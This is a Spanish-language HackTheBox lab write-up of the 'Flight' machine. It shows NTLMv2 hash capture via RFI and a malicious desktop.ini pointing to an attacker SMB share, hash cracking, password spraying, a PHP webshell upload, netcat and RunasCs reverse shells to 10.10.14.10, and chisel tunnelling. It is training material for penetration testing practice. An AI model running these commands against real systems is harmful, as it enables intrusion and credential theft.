@@ -1,0 +1,517 @@
+<!doctype html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+<title>Writeup Flight HackTheBox</title>
+<link rel="shortcut icon" type="image/png" sizes="64x64" href="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/flight.png">
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="Writeup Flight HackTheBox" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Resolución de la máquina Flight de la plataforma de HackTheBox" />
+<meta property="og:description" content="Resolución de la máquina Flight de la plataforma de HackTheBox" />
+<link rel="canonical" href="http://localhost:4000/another-page.html" />
+<meta property="og:url" content="http://localhost:4000/another-page.html" />
+<meta property="og:site_name" content="Writeup Flight HackTheBox" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Writeup Flight HackTheBox" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"Resolución de la máquina Flight de la plataforma de HackTheBox","headline":"Writeup Faculty HackTheBox","url":"http://localhost:4000/another-page.html"}</script>
+
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+    <script src="/assets/js/respond.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+
+<meta name="theme-color" content="#353535">
+<meta name="msapplication-navbutton-color" content="#353535">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+
+  </head>
+  <body>
+
+    <div class="wrapper">
+
+      <section>
+        <div id="title">
+          <h1>Writeup Flight HackTheBox</h1>
+          <p>Resolución de la máquina Flight de la plataforma de HackTheBox</p>
+        </div>
+
+<div><p>Iniciamos escaneando los puertos de la máquina con nmap</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ nmap</span><span class="p"> 10.10.11.187
+Nmap scan report for 10.10.11.187
+PORT     STATE SERVICE
+53/tcp   open  domain
+80/tcp   open  http
+88/tcp   open  kerberos-sec
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+389/tcp  open  ldap
+445/tcp  open  microsoft-ds
+464/tcp  open  kpasswd5
+593/tcp  open  http-rpc-epmap
+636/tcp  open  ldapssl
+5985/tcp open  wsman</span>
+</code></pre></div></div>
+
+<div><p>Usando curl y mirando el servidor podemos ver que se lekea el dominio flight.htb</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ curl</span><span class="p"> -s 10.10.11.187 |</span><span class="s2"> html2text </span><span class="p">|</span><span class="s2"> tail</span><span class="p"> -n3 
+Copyright 2022 </span><span class="kd">flight.htb</span><span class="p"> - All Rights Reserved
+Designed by Geiseric & JDgodd</span>
+</code></pre></div></div>
+
+<div><p>Ya que tenemos un dominio podemos intentar buscar subdominios con gobuster</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ gobuster</span><span class="p"> vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt  -u flight.htb -t 100
+===============================================================
+[+] Url:          http://flight.htb
+[+] Threads:      100
+[+] Wordlist:     /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+===============================================================
+Starting gobuster in VHOST enumeration mode
+===============================================================
+Found: </span><span class="kd">school.flight.htb</span><span class="p"> (Status: 200) [Size: 3996]</span>
+</code></pre></div></div>
+
+<div><p>Después de agregar el host podemos ver el dominio en el navegador</p></div>
+<div><p><img src="./1.png"><p></div>
+
+<div><p>Podemos fuzzear algun parametro que nos lleve a un lfi o rfi</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ wfuzz</span><span class="p"> -c -w /usr/share/seclists/Discovery/Web-Content/common.txt -u </span><span class="no">"http://school.flight.htb/index.php?FUZZ=index.php"</span><span class="p"> -t 100 --hh 3996
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://school.flight.htb/index.php?FUZZ=index.php
+Total requests: 4711
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+000004391:   </span><span class="s2">200</span><span class="p">        91 L     249 W      3194 Ch     "view"</span>
+</code></pre></div></div>
+
+<div><p>Podemos comprobar el el navegador que funciona el parametro</p></div>
+<div><p><img src="./2.png"><p></div>
+
+<div><p>Mas que intentar ver archivos locales de la máquina podemos intentar realizar un rfi a un servicio smb de nuestra maquina, asi el servicio realizará una autenticación y nos mostrara el hash ntlmv2 del usuario corriendo, tal como en la máquina <a href="https://0bfxgh0st.github.io/hackthebox-starting-point/writeups/responder.html">responder</a> del starting point</p></div>
+
+<div><p>Iniciamos creando un servicio smb asignandole un nombre</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ sudo impacket-smbserver </span><span class="p">parrotsec . -smb2support
+Impacket v0.9.25 - Copyright 2021 SecureAuth Corporation
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed</span>
+</code></pre></div></div>
+
+<div><p>Hacemos una petición usando curl, con el rfi apuntando a nuestro servicio smb</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ curl </span><span class="p">-s</span><span class="no"> "http://school.flight.htb/?view=//10.10.14.10/parrotsec"</span><span class="p"> &>/dev/null
+</span>
+</code></pre></div></div>
+
+<div><p>Revisamos nuestro servicio creado por smb y podemos ver el hash ntmlv2 de la autenticación</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">[*] Config file parsed
+[*] Incoming connection (10.10.11.187,51155)
+[*] AUTHENTICATE_MESSAGE (flight\svc_apache,G0)
+[*] User G0\svc_apache authenticated successfully
+[*] svc_apache::flight:aaaaaaaaaaaaaaaa:90d2adf9a1238c1f60cd7bfc06e2da31:010100000000000080fb15e996fad801b92679b7c9e2b2e100000000010010007300570048007100690051007900660003001000730057004800710069005100790066000200100052006f0044004e004700460046007a000400100052006f0044004e004700460046007a000700080080fb15e996fad8010600040002000000080030003000000000000000000000000030000039fe97e432d46b6a874c75adc65b49315a947ffdb6c1d420ca39b4f2ba87f3470a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00350037000000000000000000
+[*] Closing down connection (10.10.11.187,51155)
+[*] Remaining connections []</span>
+</code></pre></div></div>
+
+<div><p>Metemos el hash en un archivo de texto y procedemos a crackearlo con john</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ john</span><span class="p"> -w:/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hash
+Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
+</span><span class="kd">S@Ss!K@*t13</span><span class="p">      (</span><span class="na">svc_apache</span><span class="p">)
+Session completed</span>
+</code></pre></div></div>
+
+<div><p>Podemos comprobar las credenciales con crackmapexec y son correctas</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ crackmapexec </span><span class="p">smb 10.10.11.187 -u svc_apache -p </span><span class="no">'S@Ss!K@*t13'</span><span class="p">
+</span><span class="na">SMB</span><span class="p">         10.10.11.187    445    G0               </span><span class="na">[*]</span><span class="p"> Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
+</span><span class="na">SMB</span><span class="p">         10.10.11.187    445    G0               </span><span class="s2">[+]</span><span class="p"> flight.htb\svc_apache:S@Ss!K@*t13</span>
+</code></pre></div></div>
+
+<div><p>Con credenciales válidas podemos dumpear los usuarios existentes</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ crackmapexec </span><span class="p">smb 10.10.11.187 -u svc_apache -p </span><span class="no">'S@Ss!K@*t13'</span><span class="p"> --users
+</span><span class="na">SMB</span><span class="p">         10.10.11.187    445    G0               </span><span class="na">[*]</span><span class="p"> Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
+</span><span class="na">SMB</span><span class="p">         10.10.11.187    445    G0               </span><span class="s2">[+]</span><span class="p"> flight.htb\svc_apache:S@Ss!K@*t13 
+</span><span class="na">SMB</span><span class="p">         10.10.11.187    445    G0               </span><span class="s2">[+]</span><span class="p"> Enumerated domain user(s)
+</span><span class="na">SMB</span><span class="p">         10.10.11.187    445    G0               </span><span class="no">flight.htb\O.Possum                       badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
+</span><span class="na">SMB</span><span class="p">         10.10.11.187    445    G0               </span><span class="no">flight.htb\svc_apache                     badpwdcount: 0 baddpwdtime: 2022-11-17 21:42:14.899862+00:00
+</span><span class="na">SMB</span><span class="p">         10.10.11.187    445    G0               </span><span class="no">flight.htb\V.Stevens                      badpwdcount: 1 baddpwdtime: 2022-11-17 21:41:06.483686+00:00
+</span><span class="na">SMB</span><span class="p">         10.10.11.187    445    G0               </span><span class="no">flight.htb\D.Truff                        badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
+</span><span class="na">SMB</span><span class="p">         10.10.11.187    445    G0               </span><span class="no">flight.htb\I.Francis                      badpwdcount: 1 baddpwdtime: 2022-11-17 21:41:05.056435+00:00
+</span><span class="na">SMB</span><span class="p">         10.10.11.187    445    G0               </span><span class="no">flight.htb\W.Walker                       badpwdcount: 1 baddpwdtime: 2022-11-17 21:41:07.926283+00:00
+</span><span class="na">SMB</span><span class="p">         10.10.11.187    445    G0               </span><span class="no">flight.htb\C.Bum                          badpwdcount: 0 baddpwdtime: 2022-09-22 21:50:15.815981+00:00
+</span><span class="na">SMB</span><span class="p">         10.10.11.187    445    G0               </span><span class="no">flight.htb\M.Gold                         badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
+</span><span class="na">SMB</span><span class="p">         10.10.11.187    445    G0               </span><span class="no">flight.htb\L.Kein                         badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
+</span><span class="na">SMB</span><span class="p">         10.10.11.187    445    G0               </span><span class="no">flight.htb\G.Lors                         badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
+</span><span class="na">SMB</span><span class="p">         10.10.11.187    445    G0               </span><span class="no">flight.htb\R.Cold                         badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
+</span><span class="na">SMB</span><span class="p">         10.10.11.187    445    G0               </span><span class="no">flight.htb\S.Moon                         badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
+</span><span class="na">SMB</span><span class="p">         10.10.11.187    445    G0               </span><span class="no">flight.htb\krbtgt                         badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
+</span><span class="na">SMB</span><span class="p">         10.10.11.187    445    G0               </span><span class="no">flight.htb\Guest                          badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
+</span><span class="na">SMB</span><span class="p">         10.10.11.187    445    G0               </span><span class="no">flight.htb\Administrator                  badpwdcount: 0 baddpwdtime: 2022-11-01 02:58:04.270580+00:00</span>
+</code></pre></div></div>
+
+<div><p>Metemos los usuarios en un archivo users y probamos si otro reutiliza la contraseña</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ crackmapexec </span><span class="p">smb 10.10.11.187 -u users -p </span><span class="no">'S@Ss!K@*t13'</span><span class="p"> --continue-on-success
+</span><span class="na">SMB</span><span class="p">         10.10.11.187    445    G0               </span><span class="na">[*]</span><span class="p"> Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
+</span><span class="na">SMB</span><span class="p">         10.10.11.187    445    G0               </span><span class="kd">[-]</span><span class="p"> flight.htb\O.Possum:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
+</span><span class="na">SMB</span><span class="p">         10.10.11.187    445    G0               </span><span class="s2">[+]</span><span class="p"> flight.htb\svc_apache:S@Ss!K@*t13 
+</span><span class="na">SMB</span><span class="p">         10.10.11.187    445    G0               </span><span class="kd">[-]</span><span class="p"> flight.htb\V.Stevens:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
+</span><span class="na">SMB</span><span class="p">         10.10.11.187    445    G0               </span><span class="kd">[-]</span><span class="p"> flight.htb\D.Truff:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
+</span><span class="na">SMB</span><span class="p">         10.10.11.187    445    G0               </span><span class="kd">[-]</span><span class="p"> flight.htb\I.Francis:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
+</span><span class="na">SMB</span><span class="p">         10.10.11.187    445    G0               </span><span class="kd">[-]</span><span class="p"> flight.htb\W.Walker:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
+</span><span class="na">SMB</span><span class="p">         10.10.11.187    445    G0               </span><span class="kd">[-]</span><span class="p"> flight.htb\C.Bum:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
+</span><span class="na">SMB</span><span class="p">         10.10.11.187    445    G0               </span><span class="kd">[-]</span><span class="p"> flight.htb\M.Gold:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
+</span><span class="na">SMB</span><span class="p">         10.10.11.187    445    G0               </span><span class="kd">[-]</span><span class="p"> flight.htb\L.Kein:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
+</span><span class="na">SMB</span><span class="p">         10.10.11.187    445    G0               </span><span class="kd">[-]</span><span class="p"> flight.htb\G.Lors:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
+</span><span class="na">SMB</span><span class="p">         10.10.11.187    445    G0               </span><span class="kd">[-]</span><span class="p"> flight.htb\R.Cold:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
+</span><span class="na">SMB</span><span class="p">         10.10.11.187    445    G0               </span><span class="s2">[+]</span><span class="p"> flight.htb\S.Moon:S@Ss!K@*t13 
+</span><span class="na">SMB</span><span class="p">         10.10.11.187    445    G0               </span><span class="kd">[-]</span><span class="p"> flight.htb\krbtgt:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
+</span><span class="na">SMB</span><span class="p">         10.10.11.187    445    G0               </span><span class="kd">[-]</span><span class="p"> flight.htb\Guest:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
+</span><span class="na">SMB</span><span class="p">         10.10.11.187    445    G0               </span><span class="kd">[-]</span><span class="p"> flight.htb\Administrator:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
+</span><span class="na">SMB</span><span class="p">         10.10.11.187    445    G0               </span><span class="kd">[-]</span><span class="p"> flight.htb\:S@Ss!K@*t13 STATUS_LOGON_FAILURE</span>
+</code></pre></div></div>
+
+<div><p>S.Moon la utiliza, podemos buscar un directorio smb donde tenga permisos de escritura</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ crackmapexec </span><span class="p">smb 10.10.11.187 -u S.Moon -p </span><span class="no">'S@Ss!K@*t13'</span><span class="p"> --shares 
+</span><span class="na">SMB</span><span class="p">         10.10.11.187    445    G0               </span><span class="na">[*]</span><span class="p"> Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
+</span><span class="na">SMB</span><span class="p">         10.10.11.187    445    G0               </span><span class="s2">[+]</span><span class="p"> flight.htb\S.Moon:S@Ss!K@*t13 
+</span><span class="na">SMB</span><span class="p">         10.10.11.187    445    G0               </span><span class="s2">[+]</span><span class="p"> Enumerated shares
+</span><span class="na">SMB</span><span class="p">         10.10.11.187    445    G0               </span><span class="no">Share           Permissions     Remark
+</span><span class="na">SMB</span><span class="p">         10.10.11.187    445    G0               </span><span class="no">-----           -----------     ------
+</span><span class="na">SMB</span><span class="p">         10.10.11.187    445    G0               </span><span class="no">ADMIN$                          Remote Admin
+</span><span class="na">SMB</span><span class="p">         10.10.11.187    445    G0               </span><span class="no">C$                              Default share
+</span><span class="na">SMB</span><span class="p">         10.10.11.187    445    G0               </span><span class="no">IPC$            READ            Remote IPC
+</span><span class="na">SMB</span><span class="p">         10.10.11.187    445    G0               </span><span class="no">NETLOGON        READ            Logon server share 
+</span><span class="na">SMB</span><span class="p">         10.10.11.187    445    G0               </span><span class="no">Shared          READ,WRITE      
+</span><span class="na">SMB</span><span class="p">         10.10.11.187    445    G0               </span><span class="no">SYSVOL          READ            Logon server share 
+</span><span class="na">SMB</span><span class="p">         10.10.11.187    445    G0               </span><span class="no">Users           READ            
+</span><span class="na">SMB</span><span class="p">         10.10.11.187    445    G0               </span><span class="no">Web             READ</span>
+</code></pre></div></div>
+
+<div><p>De primeras al conectarnos con smbclient no podemos ver nada pero podemos escribir</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ smbclient </span><span class="p">//10.10.11.187/Shared -U S.Moon --password </span><span class="no">'S@Ss!K@*t13'</span><span class="p">
+Try "help" to get a list of possible commands.
+</span><span class="kd">smb: \></span><span class="p"> dir
+  .                                   D        0  Thu Nov 17 16:19:41 2022
+  ..                                  D        0  Thu Nov 17 16:19:41 2022
+
+		5056511 blocks of size 4096. 989779 blocks available
+</span><span class="kd">smb: \></span>
+</code></pre></div></div>
+
+<div><p>Creamos un archivo malicioso que apunte como icono a nuestro recurso, si alguien entra a la carpeta a monitorear intentará cargar el icono y al autenticarse nos dara el hash ntmlv2</p></div>
+
+<div><p>Podemos usar un desktop.ini con la siguiente estructura</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">[.ShellClassInfo]
+</span><span class="p">IconResource=\\10.10.14.10\parrotsec\</span>
+</code></pre></div></div>
+
+<div><p>Creamos de nuevo el servicio smb con impacket para recibir la autenticación</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ sudo impacket-smbserver </span><span class="p">parrotsec . -smb2support
+Impacket v0.9.25 - Copyright 2021 SecureAuth Corporation
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed</span>
+</code></pre></div></div>
+
+<div><p>Subimos el archivo desktop.ini y esperamos a que el usuario intente cargar</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="kd">smb: \></span><span class="p"> put desktop.ini
+putting file desktop.ini as \desktop.ini (0.2 kb/s) (average 0.2 kb/s)
+</span><span class="kd">smb: \></span><span class="p"> dir
+  .                                   D        0  Thu Nov 17 16:23:56 2022
+  ..                                  D        0  Thu Nov 17 16:23:56 2022
+  desktop.ini                         A       55  Thu Nov 17 16:23:56 2022
+
+		5056511 blocks of size 4096. 987523 blocks available
+</span><span class="kd">smb: \></span>
+</code></pre></div></div>
+
+<div><p>Después de unos momentos intentara cargar el recurso y nos llegara el hash ntmlv2</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">[*] Config file parsed
+[*] Incoming connection (10.10.11.187,51214)
+[*] AUTHENTICATE_MESSAGE (flight.htb\c.bum,G0)
+[*] User G0\c.bum authenticated successfully
+[*] c.bum::flight.htb:aaaaaaaaaaaaaaaa:dab564466243c92dd8185f3200d01abf:01010000000000008055d24d99fad8013874deb992d0058500000000010010004d0065006e0062006200640073005200030010004d0065006e0062006200640073005200020010006e007500470079007a006e004c004100040010006e007500470079007a006e004c004100070008008055d24d99fad8010600040002000000080030003000000000000000000000000030000039fe97e432d46b6a874c75adc65b49315a947ffdb6c1d420ca39b4f2ba87f3470a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00350037000000000000000000
+[*] Closing down connection (10.10.11.187,51214)
+[*] Remaining connections []</span>
+</code></pre></div></div>
+
+<div><p>Crackeamos el hash nuevo y conseguimos la contraseña de C.Bum</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ john</span><span class="p"> -w:/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hash
+Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
+</span><span class="kd">Tikkycoll_431012284</span><span class="p"> (</span><span class="na">c.bum</span><span class="p">)
+Session completed</span>
+</code></pre></div></div>
+
+<div><p>Comprobamos con las credenciales si podemos escribir en otro recurso y vemos que en web</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ crackmapexec</span><span class="p"> smb 10.10.11.187 -u C.Bum -p Tikkycoll_431012284 --shares
+</span><span class="na">SMB</span><span class="p">         10.10.11.187    445    G0               </span><span class="na">[*]</span><span class="p"> Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
+</span><span class="na">SMB</span><span class="p">         10.10.11.187    445    G0               </span><span class="s2">[+]</span><span class="p"> flight.htb\C.Bum:Tikkycoll_431012284 
+</span><span class="na">SMB</span><span class="p">         10.10.11.187    445    G0               </span><span class="s2">[+]</span><span class="p"> Enumerated shares
+</span><span class="na">SMB</span><span class="p">         10.10.11.187    445    G0               </span><span class="no">Share           Permissions     Remark
+</span><span class="na">SMB</span><span class="p">         10.10.11.187    445    G0               </span><span class="no">-----           -----------     ------
+</span><span class="na">SMB</span><span class="p">         10.10.11.187    445    G0               </span><span class="no">ADMIN$                          Remote Admin
+</span><span class="na">SMB</span><span class="p">         10.10.11.187    445    G0               </span><span class="no">C$                              Default share
+</span><span class="na">SMB</span><span class="p">         10.10.11.187    445    G0               </span><span class="no">IPC$            READ            Remote IPC
+</span><span class="na">SMB</span><span class="p">         10.10.11.187    445    G0               </span><span class="no">NETLOGON        READ            Logon server share
+</span><span class="na">SMB</span><span class="p">         10.10.11.187    445    G0               </span><span class="no">Shared          READ,WRITE
+</span><span class="na">SMB</span><span class="p">         10.10.11.187    445    G0               </span><span class="no">SYSVOL          READ            Logon server share
+</span><span class="na">SMB</span><span class="p">         10.10.11.187    445    G0               </span><span class="no">Users           READ
+</span><span class="na">SMB</span><span class="p">         10.10.11.187    445    G0               </span><span class="no">Web             READ,WRITE</span>
+</code></pre></div></div>
+
+<div><p>Al entrar con smbclient podemos ver que tenemos acceso de escritura en ambos dominios</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ smbclient </span><span class="p">//10.10.11.187/Web -U C.Bum --password Tikkycoll_431012284
+Try "help" to get a list of possible commands.
+</span><span class="kd">smb: \> </span><span class="p">dir
+  .                                   D        0  Thu Nov 17 16:38:43 2022
+  ..                                  D        0  Thu Nov 17 16:38:43 2022
+  flight.htb                          D        0  Thu Nov 17 16:37:00 2022
+  school.flight.htb                   D        0  Thu Nov 17 16:37:00 2022
+
+		5056511 blocks of size 4096. 974066 blocks available
+</span><span class="kd">smb: \></span>
+</code></pre></div></div>
+
+<div><p>Esto no podria ser mas simple, solo descargamos una <a href="https://github.com/WhiteWinterWolf/wwwolf-php-webshell">webshell</a> en php y la subimos con put</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="kd">smb: \></span><span class="p"> cd flight.htb
+</span><span class="kd">smb: \flight.htb\></span><span class="p"> put webshell.php
+putting file webshell.php as \flight.htb\webshell.php
+</span><span class="kd">smb: \flight.htb\></span>
+</code></pre></div></div>
+
+<div><p>Abrimos el php en flight.htb y podemos ejecutar comandos como svc_apache</p></div>
+<div><p><img src="./3.png"><p></div>
+
+<div><p>Para hacer una revshell podemos iniciar por crear un directorio en C:\</p></div>
+<div><p><img src="./4.png"><p></div>
+
+<div><p>Ahora descargar el netcat.exe de nuestra maquina y almacenarlo en el directorio creado</p></div>
+<div><p><img src="./5.png"><p></div>
+
+<div><p>Finalmente ejecutamos el netcat y nos enviamos una powershell</p></div>
+<div><p><img src="./6.png"><p></div>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ sudo netcat </span><span class="p">-lvnp 443
+Listening on 0.0.0.0 443
+Connection received on 10.10.11.187
+Windows PowerShell 
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\xampp\htdocs\flight.htb> </span><span class="no">whoami</span><span class="p">
+flight\svc_apache
+PS C:\xampp\htdocs\flight.htb></span>
+</code></pre></div></div>
+
+<div><p>Tenemos credenciales válidas por smb, podemos probar las de C.Bum con <a href="https://github.com/antonioCoco/RunasCs">RunasCs.exe</a></p></div>
+
+<div><p>Simplemente lo descargamos y ejecutamos pasandole las credenciales, powershell y un host</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\xampp\htdocs\flight.htb> </span><span class="no">.\RunasCs.exe C.bum Tikkycoll_431012284 powershell -r 10.10.14.10:443</span><span class="p">
+[*] Warning: Using function CreateProcessWithLogonW is not compatible with logon type 8. Reverting to logon type Interactive (2)...
+[+] Running in session 0 with process function CreateProcessWithLogonW()
+[+] Using Station\Desktop: Service-0x0-5e00b$\Default
+[+] Async process 'powershell' with pid 320 created and left in background.
+PS C:\xampp\htdocs\flight.htb></span>
+</code></pre></div></div>
+
+<div><p>Con esto recibimos una nueva shell en nuestro listener esta vez como c.bum</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ sudo netcat </span><span class="p">-lvnp 443
+Listening on 0.0.0.0 443
+Connection received on 10.10.11.187
+Windows PowerShell 
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\Windows\system32> </span><span class="no">whoami</span><span class="p">
+flight\c.bum
+PS C:\Windows\system32> </span><span class="no">type C:\Users\C.Bum\Desktop\user.txt</span><span class="p">
+1f8*************************f57
+PS C:\Windows\system32></span>
+</code></pre></div></div>
+
+<div><p>Mirando los puertos internos podemos ver que esta abierto el 8000</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Windows\system32> </span><span class="no">netstat -oat</span><span class="p">
+
+Active Connections
+
+  Proto  Local Address          Foreign Address        State           PID      Offload State
+
+  TCP    0.0.0.0:80             g0:0                   LISTENING       4648	InHost      
+  TCP    0.0.0.0:88             g0:0                   LISTENING       644	InHost      
+  TCP    0.0.0.0:135            g0:0                   LISTENING       912	InHost      
+  TCP    0.0.0.0:389            g0:0                   LISTENING       644	InHost      
+  TCP    0.0.0.0:443            g0:0                   LISTENING       4648	InHost      
+  TCP    0.0.0.0:445            g0:0                   LISTENING       4	InHost      
+  TCP    0.0.0.0:464            g0:0                   LISTENING       644	InHost      
+  TCP    0.0.0.0:593            g0:0                   LISTENING       912	InHost      
+  TCP    0.0.0.0:636            g0:0                   LISTENING       644	InHost      
+  TCP    0.0.0.0:5985           g0:0                   LISTENING       4	InHost      
+  TCP    0.0.0.0:8000           g0:0                   LISTENING       4	InHost</span>
+</code></pre></div></div>
+
+<div><p>Para hacer port forwarding iniciamos con ejecutando chisel como server</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ chisel </span><span class="p">server --reverse --port 9999
+server: Reverse tunnelling enabled
+server: Listening on http://0.0.0.0:9999</span>
+</code></pre></div></div>
+
+<div><p>Desde la máquina windows descargamos y ejecutamos chisel como cliente</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Gato> </span><span class="no">curl 10.10.14.10/chisel.exe -o chisel.exe</span><span class="p">
+</span><span class="p">PS C:\Gato></span><span class="no"> .\chisel.exe client 10.10.14.10:9999 R:8000:127.0.0.1:8000</span><span class="p">
+client: Connecting to ws://10.10.14.10:9999
+client: Connected (Latency 94.8528ms)</span>
+</code></pre></div></div>
+
+<div><p>Ahora en el localhost por el puerto 8000 tenemos un servicio web</p></div>
+<div><p><img src="./7.png"><p></div>
+
+<div><p>No hay nada interesante pero en inetpub hay un directorio que parecen ser sus recursos</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\inetpub> </span><span class="no">dir</span><span class="p">
+
+    Directory: C:\inetpub
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----        9/22/2022  12:24 PM                custerr
+d-----       11/17/2022   2:57 PM                development
+d-----        9/22/2022   1:08 PM                history
+d-----        9/22/2022  12:32 PM                logs
+d-----        9/22/2022  12:24 PM                temp
+d-----        9/22/2022  12:28 PM                wwwroot
+
+PS C:\inetpub> </span><span class="no">cd development</span><span class="p">
+PS C:\inetpub\development> </span><span class="no">dir</span><span class="p">
+
+    Directory: C:\inetpub\development
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----       11/17/2022   2:57 PM                css
+d-----       11/17/2022   2:57 PM                fonts
+d-----       11/17/2022   2:57 PM                img
+d-----       11/17/2022   2:57 PM                js
+-a----        4/16/2018   2:23 PM           9371 contact.html
+-a----        4/16/2018   2:23 PM          45949 index.html
+
+PS C:\inetpub\development></span>
+</code></pre></div></div>
+
+<div><p>La web interpreta aspx entonces subimos una shell en aspx en este directorio</p></div>
